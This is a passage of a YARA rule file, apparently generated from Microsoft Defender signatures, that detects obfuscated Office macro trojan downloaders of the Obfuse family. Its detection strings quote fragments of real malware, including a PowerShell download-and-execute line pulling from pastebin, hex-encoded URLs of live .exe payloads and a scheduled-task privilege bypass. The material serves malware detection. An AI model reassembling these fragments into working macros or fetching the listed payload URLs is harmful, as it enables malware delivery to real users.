        $x_1_4 = "d2lubWdtdHM6d2luMzJfUHJvY2Vzcw==" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JW_2147742548_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JW!MTB"
        threat_id = "2147742548"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = "68 74 74 70 3A 2F 2F 6B 6F 71 66 6B 72 6A 67 2E 77 7A 65 2E 69 6F 2F 73 71 6C 2F 6E 6E 67 76 66 64 2E 65 78 65" ascii //weight: 2
        $x_2_2 = "68 74 74 70 73 3A 2F 2F 67 61 79 74 61 6E 63 6F 6E 73 74 72 75 63 74 69 6F 6E 69 6E 63 2E 63 6F 6D 2F 6F 77 6E 2E 65 78 65" ascii //weight: 2
        $x_2_3 = "68 74 74 70 3A 2F 2F 62 72 61 6E 64 6F 74 6F 64 61 79 2E 63 6F 6D 2F 51 75 6F 74 61 74 69 6F 6E 32 2E 65 78 65" ascii //weight: 2
        $x_2_4 = "68 74 74 70 3A 2F 2F 72 65 6F 6B 61 79 74 79 2D 37 31 2E 74 6B 2F 73 71 6C 2F 68 65 64 72 74 66 77 2E 65 78 65" ascii //weight: 2
        $x_2_5 = "68 74 74 70 3A 2F 2F 67 61 79 74 61 6E 63 6F 6E 73 74 72 75 63 74 69 6F 6E 69 6E 63 2E 63 6F 6D 2F 6E 65 6C 2E 65 78 65" ascii //weight: 2
        $x_2_6 = "68 74 74 70 3A 2F 2F 70 68 61 6D 71 75 79 65 6E 2E 78 79 7A 2F 77 70 2D 63 6F 6E 74 65 6E 74 2F 74 68 65 6D 65 73 2F 62 6F 6F 74 63 61 6B 65 36 2F 51 78 7A 41 56 42 2E 65 78 65" ascii //weight: 2
        $x_2_7 = "68 74 74 70 3A 2F 2F 77 77 77 2E 65 70 79 6F 72 6B 65 2E 65 64 75 2E 62 7A 2F 2F 6C 69 62 72 61 72 69 65 73 2F 42 61 6E 6B 42 61 6E 6B 47 47 2E 65 78 65" ascii //weight: 2
        $x_2_8 = "43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 78 77 6C 66 61 64 66 72 73 2e 65 78 65" ascii //weight: 2
        $x_2_9 = "43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 73 76 63 68 6f 73 74 33 32 2e 65 78 65" ascii //weight: 2
        $x_1_10 = "4d 69 63 72 6f 73 6f 66 74 2e 58 4d 4c 48 54 54 50" ascii //weight: 1
        $x_1_11 = "57 53 63 72 69 70 74 2e 53 68 65 6c 6c" ascii //weight: 1
        $x_1_12 = {43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-100] 2c 20 [0-100] 2c 20 32 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 3 of ($x_1_*))) or
            ((3 of ($x_2_*) and 1 of ($x_1_*))) or
            ((4 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_JX_2147742549_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JX!MTB"
        threat_id = "2147742549"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {74 74 70 3a 2f 2f 62 69 22 2c 20 22 [0-9] 22 29 2c}  //weight: 1, accuracy: Low
        $x_1_2 = "Shell (" ascii //weight: 1
        $x_1_3 = "third = (third + first(second) + fourth(second Mod Len(Password))) Mod 256" ascii //weight: 1
        $x_1_4 = "fourth(second) = fourth(second) Xor first(Temp + first((third + first(third)) Mod 254))" ascii //weight: 1
        $x_1_5 = "= StrConv(Password, vbFromUnicode)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JY_2147742606_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JY!MTB"
        threat_id = "2147742606"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "& \".jse\"" ascii //weight: 1
        $x_1_2 = "= Environ(\"USERPROFILE\")" ascii //weight: 1
        $x_1_3 = ".Write jsText4Text" ascii //weight: 1
        $x_1_4 = "= \"Shell.Application\"" ascii //weight: 1
        $x_1_5 = ".ShellExecute (" ascii //weight: 1
        $x_1_6 = "& daeaf" ascii //weight: 1
        $x_1_7 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-18] 2c 20 54 72 75 65 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JY_2147742606_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JY!MTB"
        threat_id = "2147742606"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "636D64202F63207363687461736B73202F72756E202F746E205C4D6963726F736F66745C57696E646F77735C4469736B436C65616E75705C53696C656E74436C65616E7570202F49" ascii //weight: 1
        $x_1_2 = "484B43555C456E7669726F6E6D656E745C77696E646972" ascii //weight: 1
        $x_1_3 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_4 = "2B275C4E744E69542E65786527293B53746172742D536C65657020323B2053746172742D50726F636573732024656E763A617070646174615C4E744E69542E6578653B2652454D" ascii //weight: 1
        $x_1_5 = ".Run (x)" ascii //weight: 1
        $x_1_6 = ".Wait (Now + TimeValue(\"0:00:05\"))" ascii //weight: 1
        $x_1_7 = ".RegDelete qwdwwxq(\"484B43555C456E7669726F6E6D656E745C77696E646972\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JZ_2147742607_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JZ!MTB"
        threat_id = "2147742607"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 5c 54 65 6d 70 5c [0-21] 20 26 20 22 2e 6a 22 20 26 20 22 73 22}  //weight: 1, accuracy: Low
        $x_1_2 = "= Environ(d)" ascii //weight: 1
        $x_1_3 = {4f 70 65 6e 20 [0-21] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_4 = ".Caption" ascii //weight: 1
        $x_1_5 = "= CreateObject(\"Shell.Application\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KA_2147742630_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KA!MTB"
        threat_id = "2147742630"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ", Null, Null, Null" ascii //weight: 1
        $x_1_2 = {26 20 22 23 22 [0-2] 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {28 53 68 65 65 74 73 28 [0-18] 29 2e 43 65 6c 6c 73 28 [0-8] 29 2e 56 61 6c 75 65 29}  //weight: 1, accuracy: Low
        $x_1_4 = {28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 [0-21] 29 2e 56 61 6c 75 65 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-64] 29 20 53 74 65 70 20 32 [0-2] 44 69 6d}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 52 65 70 6c 61 63 65 28 [0-64] 2c 20 22 23 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KB_2147742634_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KB!MTB"
        threat_id = "2147742634"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "14"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {5c 54 65 6d 70 5c [0-21] 20 26 20 22 2e 6a 22 20 26 20 22 73 22}  //weight: 10, accuracy: Low
        $x_1_2 = "= Environ(d)" ascii //weight: 1
        $x_1_3 = ".Controls" ascii //weight: 1
        $x_1_4 = {4f 70 65 6e 20 [0-36] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_5 = ".Caption" ascii //weight: 1
        $x_1_6 = "= \"new:13709620-C279-11CE-A49E-444553540000\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 4 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_RC_2147742656_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RC"
        threat_id = "2147742656"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Selection.InsertBefore" ascii //weight: 1
        $x_1_2 = "Environ(\"USERPROFILE\")" ascii //weight: 1
        $x_1_3 = "& \".jse\"" ascii //weight: 1
        $x_1_4 = ".Write jsText4Text" ascii //weight: 1
        $x_1_5 = ".ShellExecute" ascii //weight: 1
        $x_1_6 = "& daeaf" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KE_2147742712_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KE!MTB"
        threat_id = "2147742712"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"user\"" ascii //weight: 1
        $x_1_2 = "= \"profile\"" ascii //weight: 1
        $x_1_3 = "= New WshShell" ascii //weight: 1
        $x_1_4 = {26 20 43 68 72 24 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-16] 2c}  //weight: 1, accuracy: Low
        $x_1_5 = {4f 70 65 6e 20 [0-16] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_6 = "ActiveDocument.Bookmarks" ascii //weight: 1
        $x_1_7 = "ActiveDocument.AcceptAllRevisionsShown" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KF_2147742714_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KF!MTB"
        threat_id = "2147742714"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Nh(\"app\" & Qy) & i & \"putty.\" & a" ascii //weight: 1
        $x_1_2 = "Vdc.createElement(\"b64\")" ascii //weight: 1
        $x_1_3 = "= \"bin.base64\"" ascii //weight: 1
        $x_1_4 = "= \"exe\"" ascii //weight: 1
        $x_1_5 = ".createTextFile(" ascii //weight: 1
        $x_1_6 = {3d 20 53 74 72 43 6f 6e 76 28 [0-6] 2c 20 76 62 55 6e 69 63 6f 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KH_2147742719_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KH!MTB"
        threat_id = "2147742719"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-7] 28 [0-9] 2e [0-9] 2c 20 22 76 65 72 69 6e 73 74 65 72 65 2e 78 6c 73 22 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_2 = "(Environ(\"TEMP\"))" ascii //weight: 1
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-7] 2e 54 61 67 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KK_2147742802_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KK!MTB"
        threat_id = "2147742802"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(\"return selectClear.split('').reverse().join('');}mainWindowTmp =\")" ascii //weight: 1
        $x_1_2 = "= \"explorer.exe c:\\programdata\\deleteMainMain.hta\"" ascii //weight: 1
        $x_1_3 = "= Split(p(frm.getwc), \" \")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KK_2147742802_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KK!MTB"
        threat_id = "2147742802"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 69 6e 6d 22 20 2b 20 22 67 6d 74 73 3a 57 69 6e 33 32 5f 50 72 6f 63 65 73 73 22 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 6d 74 73 3a 57 69 6e 33 32 5f 50 72 6f 63 65 73 73 22 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 6d 74 73 3a 22 20 2b 20 22 57 69 6e 33 32 5f 50 72 6f 63 65 73 73 22 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 6d 74 73 3a 57 69 6e 22 20 2b 20 22 33 32 5f 50 72 6f 63 65 73 73 22 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 69 6e 22 20 2b 20 22 6d 67 6d 74 73 3a 57 69 6e 22 20 2b 20 22 33 32 5f 50 72 6f 63 65 73 73 22 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 69 6e 22 20 2b 20 22 6d 67 6d 74 22 20 2b 20 22 73 3a 57 69 6e 22 20 2b 20 22 33 32 5f 50 72 6f 63 65 73 73 22 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_7 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 6d 74 73 3a 22 20 2b 20 22 57 69 6e 33 32 5f 50 72 6f 22 20 2b 20 22 63 65 73 73 22 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_8 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 52 65 70 6c 61 63 65 28 22 77 20 20 20 20 69 20 20 20 20 20 6e 6d 20 20 20 20 67 6d 74 73 3a 57 69 6e 20 20 20 20 33 32 20 20 20 5f 50 72 20 20 20 20 6f 63 20 20 20 65 73 73 22 2c 20 22 20 22 2c 20 22 22 29 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_9 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 52 65 70 6c 61 63 65 28 22 77 69 6e 6d 20 20 20 20 67 6d 74 20 20 20 73 3a 57 69 20 20 20 20 6e 20 20 20 20 33 32 20 20 20 5f 50 72 20 20 20 20 6f 63 65 20 20 20 20 73 73 22 2c 20 22 20 22 2c 20 22 22 29 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_10 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 52 65 70 6c 61 63 65 28 22 40 40 40 77 69 40 40 6e 6d 40 40 40 40 40 40 67 40 6d 74 40 40 40 40 40 73 3a 57 69 6e 40 40 40 40 33 32 5f 50 72 6f 63 40 40 40 40 40 65 73 40 40 40 40 73 22 2c 20 22 40 22 2c 20 22 22 29 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_11 = {2b 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e [0-9] 2e 43 61 70 74 69 6f 6e 20 2b 20 54 68 69 73 44 6f 63 75 6d 65 6e 74}  //weight: 1, accuracy: Low
        $x_1_12 = "ShowWindow! _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KL_2147742806_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KL!MTB"
        threat_id = "2147742806"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Tag & \"535\" + \"\\as\" + \"po\" + \"to.e\" + \"xe\"" ascii //weight: 1
        $x_1_2 = "+ \"\\Ap\" + \"pDa\" + \"ta\\R\" + \"oa\" + \"mi\" + \"ng\" & \"\\\"" ascii //weight: 1
        $x_1_3 = "= \"r-paym\" + \"ent/ima\" + \"ges/sh\" + \"ao.j\" + \"pg\"" ascii //weight: 1
        $x_1_4 = "& \"', '%APPDATA%\\mo' + 'l25' + '35\\as' + 'pot' + 'o.ex' + 'e')\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KL_2147742806_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KL!MTB"
        threat_id = "2147742806"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {4f 70 65 6e 20 22 43 3a 5c 44 69 73 6b 44 72 69 76 65 5c 31 5c 56 6f 6c 75 6d 65 5c [0-20] 2e 62 61 74 22}  //weight: 2, accuracy: Low
        $x_2_2 = "fStrForPathLoad = fStrForPathLoad & \"\\\"" ascii //weight: 2
        $x_1_3 = {45 6e 76 69 72 6f 6e 28 22 61 70 70 64 61 74 61 22 29 20 26 20 22 [0-10] 22}  //weight: 1, accuracy: Low
        $x_1_4 = {4f 70 65 6e 20 22 43 3a 5c 44 69 73 6b 44 72 69 76 65 5c 31 5c 56 6f 6c 75 6d 65 5c [0-10] 2e 6a 73 65 22}  //weight: 1, accuracy: Low
        $x_1_5 = {43 3a 5c 44 69 73 6b 44 72 69 76 65 5c 31 5c 56 6f 6c 75 6d 65 5c [0-20] 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_6 = "Caption & GiftToPapper.DefaultTargetFrame & \"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 4 of ($x_1_*))) or
            ((2 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_KN_2147742828_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KN!MTB"
        threat_id = "2147742828"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Environ$(\"USERPROFILE\") & StrReverse(\"piz.Updates\\stnemucoD\\\")" ascii //weight: 1
        $x_1_2 = "= Shell(Startup.Files1, 1)" ascii //weight: 1
        $x_1_3 = {3d 20 53 70 6c 69 74 28 42 74 2c 20 22 [0-1] 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = ".CopyHere ShellAppzz.Namespace(Pathzz).Items" ascii //weight: 1
        $x_1_5 = "& StrReverse(\"piz." ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KO_2147742838_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KO!MTB"
        threat_id = "2147742838"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \".jse\"" ascii //weight: 1
        $x_1_2 = "jsText4Text" ascii //weight: 1
        $x_1_3 = {54 65 78 74 3a 3d 22 3d 20 22 20 2b 20 [0-19] 20 2b 20 22 20 5c 2a 20 43 61 72 64 54 65 78 74 22 2c 20 5f}  //weight: 1, accuracy: Low
        $x_1_4 = "= \"WScript.Shell\"" ascii //weight: 1
        $x_1_5 = "= WSShell.SpecialFolders(\"MyDocuments\")" ascii //weight: 1
        $x_1_6 = "Open file2savrsave For Output As #1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KP_2147742845_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KP!MTB"
        threat_id = "2147742845"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub Auto_Open()" ascii //weight: 1
        $x_1_2 = "powershell.exe \"\"IEX ((new-object net.webclient)" ascii //weight: 1
        $x_1_3 = ".downloadstring('https://pastebin.com/raw/" ascii //weight: 1
        $x_1_4 = "Get-ComputerDetails" ascii //weight: 1
        $x_1_5 = {53 68 65 6c 6c 20 28 [0-9] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KQ_2147742865_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KQ!MTB"
        threat_id = "2147742865"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ", Null, Null, Null" ascii //weight: 1
        $x_1_2 = {26 20 43 68 72 28 [0-69] 29 [0-2] 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {53 68 65 65 74 73 28 [0-18] 29 2e 43 65 6c 6c 73 28 [0-8] 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_4 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 [0-24] 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-64] 29 20 53 74 65 70 20 32 [0-2] 44 69 6d}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 4d 69 64 28 [0-64] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KR_2147742870_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KR!MTB"
        threat_id = "2147742870"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "+ 1 & \"F.wll\"" ascii //weight: 1
        $x_1_2 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-20] 29 20 53 74 65 70 20 32 3a 20 2e 57 72 69 74 65 20 43 68 72 28 43 42 79 74 65 28 22 26 48 22 20 26 20 4d 69 64 28 [0-20] 2c 20 6c 70 2c 20 32 29 29 29 3a 20 4e 65 78 74 3a 20 45 6e 64 20 57 69 74 68 3a 20 6f 62 6a 46 69 6c 65 2e 43 6c 6f 73 65}  //weight: 1, accuracy: Low
        $x_1_3 = "MsgBox \"The document is protected, you will need to specify a password to unlock.\"" ascii //weight: 1
        $x_1_4 = "= Environ(\"APPDATA\") & \"\\Microsoft\\Word\\Startup\\\"" ascii //weight: 1
        $x_1_5 = ".CreateTextFile(p, True)" ascii //weight: 1
        $x_1_6 = ".site/share.php\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KS_2147742871_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KS!MTB"
        threat_id = "2147742871"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
